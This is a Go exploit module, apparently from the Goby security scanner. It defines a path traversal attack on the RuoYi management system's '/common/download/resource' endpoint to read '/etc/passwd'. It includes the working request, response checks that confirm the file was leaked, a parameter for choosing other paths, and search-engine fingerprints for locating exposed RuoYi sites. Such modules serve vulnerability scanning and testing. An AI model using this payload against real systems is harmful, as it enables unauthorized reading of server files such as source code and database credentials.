package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "RuoYi CMS Arbitrary File Read",
    "Description": "Ruoyi CMS has arbitrary file read vulnerability, can read any file on the server.",
    "Impact": "RuoYi CMS Arbitrary File Read",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update: <a href=\"http://www.ruoyi.vip/\">http://www.ruoyi. vip/</a></p>",
    "Product": "RuoYi",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "若依管理系统 resource 文件 resource 参数 任意文件读取漏洞",
            "Description": "<p>若依管理系统是一款基于SpringBoot的权限管理系统。</p><p>若依管理系统 存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Impact": "<p>若依管理系统 存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.ruoyi.vip/\" target=\"_blank\">http://www.ruoyi.vip/</a><br></p>",
            "Product": "RuoYi",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "RuoYi CMS Arbitrary File Read",
            "Description": "Ruoyi CMS has arbitrary file read vulnerability, can read any file on the server.",
            "Impact": "RuoYi CMS Arbitrary File Read",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update: <a href=\"http://www.ruoyi.vip/\" target=\"_blank\">http://www.ruoyi. vip/</a><br></p>",
            "Product": "RuoYi",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "(body=\"ruoyi/\") || (body=\"/ry-ui.css\" || body=\"/ry-ui.js\" || title=\"若依管理系统\") || (body=\"/ry-ui.css\" || body=\"/ry-ui.js\" || body=\"若依管理系统\") || (title=\"登录若依系统\")",
    "GobyQuery": "(body=\"ruoyi/\") || (body=\"/ry-ui.css\" || body=\"/ry-ui.js\" || title=\"若依管理系统\") || (body=\"/ry-ui.css\" || body=\"/ry-ui.js\" || body=\"若依管理系统\") || (title=\"登录若依系统\")",
    "Author": "gobysec@gmail.com",
    "Homepage": "http://www.ruoyi.vip/",
    "DisclosureDate": "2021-06-07",
    "References": [
        "https://www.seebug.org/vuldb/ssvid-99226"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/common/download/resource?resource=/profile/../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ":/bin/",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/common/download/resource?resource=/profile/../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": ":/bin/",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "Path",
            "type": "input",
            "value": "../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
